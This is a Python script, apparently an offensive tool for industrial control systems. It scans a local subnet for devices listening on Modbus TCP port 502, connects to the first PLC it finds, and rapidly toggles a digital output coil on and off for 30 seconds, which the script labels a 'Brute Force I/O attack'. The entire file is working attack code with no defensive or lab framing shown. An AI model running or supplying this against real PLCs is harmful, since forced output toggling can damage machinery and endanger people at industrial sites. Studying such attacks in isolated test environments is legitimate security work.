import socket
from pymodbus.client.sync import ModbusTcpClient
from pymodbus.exceptions import ModbusIOException
import time

# Define parameters
SUBNET = "192.168.9."  # Adjust based on your network
MODBUS_PORT = 502      # Modbus TCP port
OUTPUT_REGISTER_START = 0  # Base address for %Q0.x digital outputs
OUTPUT_REGISTER_COUNT = 6  # Total number of digital outputs (%Q0.0 to %Q0.5)
BRUTE_FORCE_OUTPUT = 0     # Target output to toggle (%Q0.0 in this example)
TOGGLE_DELAY = 0.1         # Delay between toggles (in seconds)
DURATION = 30              # Duration to perform Brute Force I/O attack (seconds)

# Find PLC's IP address
def find_plc_ip():
    print("Starting IP scan...")
    for i in range(1, 255):  # Scan the entire subnet range (192.168.9.1 to 192.168.9.254)
        ip = f"{SUBNET}{i}"
        try:
            # Attempt to open a socket to the Modbus TCP port
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.5)  # Timeout if no response in 0.5s
                result = sock.connect_ex((ip, MODBUS_PORT))
                if result == 0:
                    print(f"PLC found at IP: {ip}")
                    return ip
        except Exception as e:
            pass  # Ignore errors and continue scanning
    print("No PLCs found on the subnet.")
    return None

# Perform Brute Force I/O attack
def brute_force_io(plc_ip):
    print(f"Connecting to PLC at {plc_ip}...")
    client = ModbusTcpClient(plc_ip)
    if not client.connect():
        print(f"Failed to connect to PLC at {plc_ip}")
        return

    print(f"Starting Brute Force I/O attack on output %Q0.{BRUTE_FORCE_OUTPUT}...")
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            # Toggle the targeted output ON
            client.write_coil(OUTPUT_REGISTER_START + BRUTE_FORCE_OUTPUT, True)
            time.sleep(TOGGLE_DELAY)
            
            # Toggle the targeted output OFF
            client.write_coil(OUTPUT_REGISTER_START + BRUTE_FORCE_OUTPUT, False)
            time.sleep(TOGGLE_DELAY)
        except ModbusIOException:
            print("Modbus communication error occurred.")
            break
        except Exception as e:
            print(f"Exception: {e}")
            break

    client.close()
    print("Brute Force I/O attack completed.")
    
# Main logic
if __name__ == "__main__":
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()
    if not plc_ip:
        print("No PLC found. Exiting.")
    else:
        # Step 2: Perform Brute Force I/O attack
        brute_force_io(plc_ip)